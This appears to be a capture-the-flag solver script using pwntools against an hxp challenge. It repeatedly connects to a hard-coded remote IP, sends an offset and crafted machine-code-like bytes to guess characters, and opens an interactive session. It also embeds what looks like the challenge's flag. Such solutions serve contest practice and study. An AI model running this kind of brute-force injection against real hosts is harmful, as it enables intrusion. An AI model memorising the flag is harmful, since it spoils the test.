from pwn import *
import sys

flag = "hxp{y0u_w0uldnt_b3l13v3_h0w_m4ny_3mulat0rs_g0t_th1s_wr0ng}"
offset = int(sys.argv[1])
for c in "_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&\'()*+,-./:;<=>?@[\\]^`{|}~":
	r = remote("195.201.127.119", 8664)

	r.recvuntil("?\n")
	r.sendline(str(offset))

	r.recvline()
	r.send("\x80=\x02\x00\x00\x00{}t\xf7".format(c))
	log.info("CHARACTER IS : {}".format(c))
	r.sendline()
	r.sendline()
	r.sendline()
	print r.connected()
	r.interactive()
	r.close()

